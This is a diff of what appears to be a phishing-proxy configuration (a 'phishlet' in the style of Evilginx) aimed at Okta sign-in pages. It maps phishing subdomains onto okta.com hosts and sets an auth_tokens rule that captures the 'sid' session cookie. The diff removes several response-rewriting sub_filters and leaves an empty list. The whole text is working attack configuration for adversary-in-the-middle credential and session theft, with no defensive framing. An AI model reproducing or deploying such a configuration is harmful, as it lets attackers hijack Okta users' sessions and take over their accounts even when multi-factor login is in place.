@@ -4,11 +4,7 @@ proxy_hosts:
   - {phish_sub: 'login', orig_sub: 'login', domain: 'okta.com', session: false, is_landing: false}
   - {phish_sub: '', orig_sub: '', domain: 'okta.com', session: false, is_landing: false }
   - {phish_sub: 'EXAMPLE', orig_sub: 'EXAMPLE', domain: 'okta.com', session: true, is_landing: true}
-sub_filters:
-  - {triggers_on: 'EXAMPLE.okta.com', orig_sub: 'EXAMPLE', domain: 'okta.com', search: 'https://{hostname}/api', replace: 'https://{hostname}/api', mimes: ['text/html', 'application/json']}
-  - {triggers_on: 'login.okta.com', orig_sub: '', domain: 'okta.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json']}
-  - {triggers_on: 'EXAMPLE.okta.com', orig_sub: '', domain: 'EXAMPLE.okta.com', search: 'https\\x3A\\x2F\\x2F{hostname}', replace: 'https\x3A\x2F\x2F{hostname}', mimes: ['text/html', 'application/json', 'application/x-javascript', 'text/javascript']}
-  - {triggers_on: 'EXAMPLE.okta.com', orig_sub: '', domain: 'EXAMPLE.okta.com', search: '\\x2Fuser\\x2Fnotifications', replace: 'https\x3A\x2F\x2FEXAMPLE.okta.com\x2Fuser\x2Fnotifications', mimes: ['text/html', 'application/json', 'application/x-javascript', 'text/javascript']}
+sub_filters: []
 auth_tokens:
   - domain: 'EXAMPLE.okta.com'
     keys: ['sid']
